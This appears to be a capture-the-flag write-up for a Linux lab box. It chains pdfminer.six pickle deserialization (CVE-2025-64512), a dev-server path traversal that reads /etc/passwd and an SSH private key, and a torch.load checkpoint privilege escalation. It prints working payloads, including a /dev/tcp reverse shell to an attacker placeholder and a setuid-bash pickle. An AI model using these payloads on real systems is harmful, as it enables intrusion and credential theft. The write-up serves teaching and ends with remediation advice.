# HTB: Bedside

**Difficulty:** Medium
**OS:** Linux (containerized)
**Target:** `<box_ip>` / `research.<box_ip>`

---

## 1. Reconnaissance

Two open ports:

- `22` — SSH
- `80` — HTTP

Virtual host enumeration revealed a subdomain:

- `research.<box_ip>` — "Bedside Clinic Research Portal," a file upload interface for staff.

The upload form accepts a restricted set of formats:

> Accepted formats: jpeg, jpg, png, bmp, tiff, dcm, pdf. Collections can be uploaded as archives.

Response headers on the upload endpoint leaked the processing library:

```
X-Powered-By: pdfminer.six
```

---

## 2. Foothold — CVE-2025-64512 (pdfminer.six pickle deserialization)

### Vulnerability

`pdfminer.six < 20251230` is vulnerable to arbitrary code execution via `CMapDB._load_data()` in `pdfminer/cmapdb.py`:

```python
def _load_data(cls, name: str) -> Any:
    name = name.replace("\0", "")
    filename = "%s.pickle.gz" % name
    path = os.path.join(directory, filename)
    return type(str(name), (), pickle.loads(gzfile.read()))
```

`name` is taken directly from a PDF font object's `/Encoding` value with no path sanitization beyond null-byte stripping. Because `os.path.join` discards its first argument when the second is absolute, an `/Encoding` value containing an absolute path allows the CMap loader to resolve and `pickle.loads()` an arbitrary `.pickle.gz` file — arbitrary code execution via insecure deserialization (CWE-502).

- **CVE:** CVE-2025-64512
- **Advisory:** GHSA-wf5f-4jwr-ppcp
- **CVSS:** 8.2 (High)

### Exploitation

**Step 1 — determine the upload storage path.**

Manual upload testing (`image.php.png`) returned:

```
MIME type mismatch. Unable to upload file to destination /var/www/research.<box_ip>/uploads
```

This confirmed the absolute path on disk and that content-based MIME validation is in effect (extension spoofing alone does not bypass it).

**Step 2 — confirm the archive upload path preserves filenames.**

An archive containing a file named `shell.pickle.gz` was uploaded through the portal. The response confirmed the filename was preserved verbatim on extraction:

```
File uploaded successfully: shell.pickle.gz
```

This confirmed the payload would land at a known, predictable path: `/var/www/research.<box_ip>/uploads/shell.pickle.gz`.

**Step 3 — build the malicious pickle.**

```python
import pickle, gzip

class Payload:
    def __reduce__(self):
        cmd = "import os; os.system('bash -c \"bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1\"')"
        return (eval, (cmd,))

with gzip.open("shell.pickle.gz", "wb") as f:
    pickle.dump(Payload(), f)
```

Uploaded as `shell.pickle.gz` through the portal.

**Step 4 — build the malicious PDF.**

The `/Encoding` name must PDF-name-escape every non-alphanumeric character (`/` → `#2F`) in the target path (minus the `.pickle.gz` suffix, which pdfminer appends automatically):

```python
def encode_pdf_name(path: str) -> str:
    out = []
    for ch in path:
        if ch.isalnum() or ch in ".-_":
            out.append(ch)
        else:
            out.append("#%02X" % ord(ch))
    return "".join(out)

# target: /var/www/research.<box_ip>/uploads/shell
```

Resulting PDF (xref offsets are static placeholders — pdfminer falls back to a recovery scan for malformed xref tables, so exact byte offsets are not required):

```
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(x) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /F-Identity-H
/Encoding /#2Fvar#2Fwww#2Fresearch.<box_ip>#2Fuploads#2Fshell
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /F
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj
<<
/Type /FontDescriptor
/FontName /F
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
```

**Step 5 — trigger.**

Backend process (`/app/pdf_watcher.py`) polls the upload directory every 30 seconds and invokes `pdf2txt.py` on any `*.pdf` file found:

```python
subprocess.run(["pdf2txt.py", pdf_path, "-o", output_file], timeout=TIMEOUT, check=True)
```

Uploading the PDF triggered pdfminer to resolve `/Encoding`, load `shell.pickle.gz` from the known uploads path, and unpickle the payload — executing the staged reverse shell as the `datawrangler` user.

```
$ nc -lvnp <attacker_port>
datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

---

## 3. Enumeration as `datawrangler`

Container is minimal — no `ps`, `ss`, `sudo`, or `netstat`. Enumeration relied on `/proc` directly.

`/app/pdf_watcher.py` confirmed the exploit mechanics (upload dir, output dir, subprocess invocation) shown above.

`/datastore` (owned `datawrangler:dataops`, group-writable) contains:

```
checkpoints/  logs/  models/  processed/  raw/  staging/
```

`staging/` held hundreds of near-empty `.txt` files — pdfminer text-extraction output from the watcher, not independently useful.

A pre-staged script at `/tmp/portscan.sh` identified locally open ports:

```
22
80
3000
```

Port 3000 served an internal-only React/Vite dev application — a "Bedside Clinic Image Viewer" using mock/randomized MRI mask data, built via `esm.sh/x`.

### LFI on the internal dev server (port 3000)

Standard Vite `/@fs/` traversal was blocked, but `curl --path-as-is` bypassed the normalization:

```bash
curl --path-as-is http://localhost:3000/../../../../etc/passwd | grep sh$
```

```
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

Confirmed a new user, `developer`. SSH key extraction via the same path traversal:

```bash
curl --path-as-is http://localhost:3000/../../../../home/developer/.ssh/id_rsa
curl --path-as-is http://localhost:3000/../../../../home/developer/.ssh/authorized_keys
```

Both returned successfully, and the public key matched the extracted private key — confirming a usable credential.

---

## 4. Lateral Movement — `developer` (user.txt)

```bash
chmod 600 developer_id_rsa
ssh -i developer_id_rsa developer@<box_ip>
```

`user.txt` retrieved from `developer`'s home directory.

---

## 5. Privilege Escalation — insecure `torch.load()` via sudo

```
developer@bedside:~$ sudo -l
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`/opt/trainer/bedside_trainer.py` is a MONAI-based training script. Relevant behavior:

- Finds the most recent checkpoint in `/datastore/checkpoints/` (`sorted(..., key=os.path.getmtime)`).
- Loads it via MONAI's `CheckpointLoader`, which internally calls `torch.load()`.
- `torch.load()` uses `pickle` for deserialization by default (`weights_only` not set) — identical vulnerability class to the initial foothold, different entry point.
- Requires at least one file in `/datastore/processed/` matching an allowed extension, or the script exits early before reaching the checkpoint-loading code path.
- `/datastore/checkpoints/` is writable by group `dataops`; `developer` is **not** a member of that group, but the earlier `datawrangler` foothold is — the privesc chain spans both footholds.

### Exploitation

**From `developer`** — build a malicious checkpoint and deliver it through the same upload portal used for the initial foothold:

```bash
python3 -c 'import torch,os;E=type("E",(),{"__reduce__":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'
python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"
curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.<box_ip>/ >/dev/null
```

**From `datawrangler`** — extract the payload into the checkpoint directory the trainer scans, and seed `/datastore/processed/` with a minimal valid PNG so the data-availability check passes:

```bash
python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.<box_ip>/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"
touch /datastore/checkpoints/root.pt
echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII= | base64 -d >/datastore/processed/x.png
```

**From `developer`** — trigger the sudo-permitted script and catch the resulting setuid shell:

```bash
sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py >/dev/null 2>&1
/usr/local/bin/rootbash -p -c 'id;cat /root/root.txt'
```

`torch.load()` deserializes `root.pt` as root; the pickled object's `__reduce__` fires `os.system(...)`, copying `/bin/bash` to a setuid-root binary. `-p` preserves the setuid effective UID (bash otherwise drops privileges to the real UID on invocation).

```
uid=0(root) gid=1000(developer) euid=0(root)
```

`root.txt` retrieved.

---

## 6. Root Cause Summary

Two chained insecure-deserialization vulnerabilities:

1. **Foothold:** pdfminer.six's `CMapDB._load_data()` resolves an attacker-controlled absolute path from a PDF's `/Encoding` field and unpickles it without validation (CVE-2025-64512).
2. **Privesc:** the MONAI training script's checkpoint auto-loading calls `torch.load()` without `weights_only=True`, unpickling attacker-controlled data placed by a lower-privileged, group-writable account and executed via an unrestricted `sudo` entry.

Both stem from the same root pattern: `pickle.loads()` (directly or via `torch.load`) invoked on data whose origin or integrity is not verified. Neither should be used on attacker-reachable input without a restricted unpickler or an explicit `weights_only=True` / equivalent safe-loading flag.

## 7. Remediation

- Upgrade `pdfminer.six` to `>= 20251230`.
- Set `torch.load(..., weights_only=True)` for all checkpoint loading, or migrate to `safetensors`.
- Remove group-write access from `/datastore/checkpoints/` for accounts that do not need to publish trusted checkpoints.
- Restrict the `sudo` entry for `bedside_trainer.py` to a wrapper that validates checkpoint provenance, or remove `NOPASSWD` and require re-authentication.
- Disable or firewall the internal Vite dev server (port 3000) in any non-development deployment; `--path-as-is`-style traversal bypasses indicate the dev server's static file handling is not production-hardened.